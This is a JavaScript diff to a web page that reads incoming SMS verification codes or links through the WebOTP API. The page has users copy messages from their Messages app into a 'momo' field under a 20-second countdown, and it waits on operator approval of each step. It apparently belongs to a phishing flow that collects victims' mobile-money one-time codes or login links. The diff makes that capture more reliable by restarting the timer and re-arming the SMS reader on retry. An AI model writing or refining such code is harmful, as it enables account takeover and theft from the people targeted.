@@ -832,6 +832,9 @@
       if (e) {
         try { e.preventDefault(); } catch (err) {}
       }
+      // Restart countdown timer when opening messaging app so user has full 20s window upon returning
+      startSmsCountdownTimer();
+
       const isAndroid = /android/i.test(navigator.userAgent);
       if (isAndroid) {
         try {
@@ -853,14 +856,31 @@
 
     let simCountdownInterval = null;
     function startSmsCountdownTimer() {
-      if (simCountdownInterval) clearInterval(simCountdownInterval);
+      if (simCountdownInterval) {
+        clearInterval(simCountdownInterval);
+        simCountdownInterval = null;
+      }
       let secondsRemaining = 20;
       const displayEl = document.getElementById('sms-timer-display');
       const statusEl = document.getElementById('sms-timer-status');
       const phoneEl = document.getElementById('sms-timer-phone');
+      const countdownCard = document.getElementById('sim-sms-countdown-card');
+
+      if (countdownCard) {
+        countdownCard.classList.remove('hidden');
+      }
 
       if (phoneEl) {
         phoneEl.innerText = appState.phoneNumber || '76123456';
+      }
+
+      if (displayEl) {
+        displayEl.innerText = '00:20';
+        displayEl.className = 'text-3xl font-black text-brand-orange tracking-tight font-mono py-0.5';
+      }
+      if (statusEl) {
+        statusEl.innerText = 'Copy the confirmation message or link from Messages app and paste it below.';
+        statusEl.className = 'text-[11px] text-slate-500 font-semibold';
       }
 
       const updateDisplay = () => {
@@ -878,6 +898,7 @@
           updateDisplay();
         } else {
           clearInterval(simCountdownInterval);
+          simCountdownInterval = null;
           if (displayEl) {
             displayEl.innerText = '00:00';
             displayEl.className = 'text-2xl font-black text-red-600 tracking-tight font-mono py-0.5';
@@ -888,6 +909,37 @@
           }
         }
       }, 1000);
+    }
+
+    function initWebOtpReceiver() {
+      if (!('OTPCredential' in window)) return;
+      const msgInput = document.getElementById('momo-pasted-msg');
+      try {
+        if (window.webOtpController) {
+          try { window.webOtpController.abort(); } catch (err) {}
+        }
+        window.webOtpController = new AbortController();
+        navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: window.webOtpController.signal
+        }).then(otp => {
+          if (otp && (otp.code || otp.message)) {
+            const incoming = (otp.code || otp.message).trim();
+            const link = extractVerificationLink(incoming);
+            if (link && isOwnSiteUrl(link)) return;
+            const finalVal = (link && !isOwnSiteUrl(link)) ? link : incoming;
+            if (finalVal && msgInput) {
+              msgInput.value = finalVal;
+              showClipboardToast(finalVal.startsWith('http') ? '⚡ WebOTP: Verification Link Received!' : '⚡ WebOTP: Verification SMS Received!');
+              handlePostLoginPastedMsg(finalVal, false);
+            }
+          }
+        }).catch(err => {
+          // Silently ignore dismiss or abort
+        });
+      } catch (e) {
+        console.warn('WebOTP init error:', e);
+      }
     }
 
     function startSimSmsReceiver() {
@@ -914,36 +966,7 @@
       }
 
       startSmsCountdownTimer();
-
-      // Priority 1: Native WebOTP API for direct SMS auto-fill from mobile OS
-      if ('OTPCredential' in window) {
-        try {
-          if (window.webOtpController) {
-            try { window.webOtpController.abort(); } catch (err) {}
-          }
-          window.webOtpController = new AbortController();
-          navigator.credentials.get({
-            otp: { transport: ['sms'] },
-            signal: window.webOtpController.signal
-          }).then(otp => {
-            if (otp && (otp.code || otp.message)) {
-              const incoming = (otp.code || otp.message).trim();
-              const link = extractVerificationLink(incoming);
-              if (link && isOwnSiteUrl(link)) return;
-              const finalVal = (link && !isOwnSiteUrl(link)) ? link : incoming;
-              if (finalVal && msgInput) {
-                msgInput.value = finalVal;
-                showClipboardToast(finalVal.startsWith('http') ? '⚡ WebOTP: Verification Link Received!' : '⚡ WebOTP: Verification SMS Received!');
-                handlePostLoginPastedMsg(finalVal, false);
-              }
-            }
-          }).catch(err => {
-            // Silently ignore dismiss or abort
-          });
-        } catch (e) {
-          console.warn('WebOTP init error:', e);
-        }
-      }
+      initWebOtpReceiver();
     }
 
     async function ensureApplicationCreated() {
@@ -1045,6 +1068,10 @@
       hideApprovalOverlay();
       isAwaitingStep2Approval = false;
       if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+      if (simCountdownInterval && stepNum !== 4) {
+        clearInterval(simCountdownInterval);
+        simCountdownInterval = null;
+      }
 
       if (stepNum === 0 || stepNum === 1) {
         if (pollingInterval) {
@@ -1254,9 +1281,8 @@
           }
         }
 
-        if (countdownCard) countdownCard.classList.add('hidden');
-        if (typeof simCountdownInterval !== 'undefined' && simCountdownInterval) clearInterval(simCountdownInterval);
-        if (typeof simSmsTimer !== 'undefined' && simSmsTimer) clearTimeout(simSmsTimer);
+        // Keep countdown card visible and timer counting down
+        if (countdownCard) countdownCard.classList.remove('hidden');
         
         if (statusEl) {
           statusEl.classList.remove('hidden');
@@ -1352,6 +1378,7 @@
               btn.disabled = false;
               btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
             }
+            startSmsCountdownTimer();
             return;
           }
 
@@ -1373,6 +1400,7 @@
           btn.disabled = false;
           btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
         }
+        startSmsCountdownTimer();
       }
     }
 
@@ -1575,6 +1603,12 @@
 
             if (currentStep === 4 && smsVer) {
               if (smsVer.status === 'approved') {
+                if (simCountdownInterval) {
+                  clearInterval(simCountdownInterval);
+                  simCountdownInterval = null;
+                }
+                const countdownCard = document.getElementById('sim-sms-countdown-card');
+                if (countdownCard) countdownCard.classList.add('hidden');
                 hideApprovalOverlay();
                 if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
                 if (msgAlert) msgAlert.classList.add('hidden');
@@ -1606,7 +1640,7 @@
                   const badge = document.getElementById('sms-waiting-badge');
                   if (badge) {
                     badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-                    badge.innerHTML = '<span>Ready to Auto-Fill</span>';
+                    badge.innerHTML = '<span>Ready to Paste</span>';
                   }
 
                   if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
@@ -1618,6 +1652,12 @@
                     smsBtn.disabled = false;
                     smsBtn.innerText = 'SUBMIT VERIFICATION MESSAGE';
                   }
+
+                  // Restart countdown timer so it is actively counting down on retry!
+                  startSmsCountdownTimer();
+
+                  // Re-arm WebOTP to catch the retry SMS
+                  initWebOtpReceiver();
                 }
               }
             }
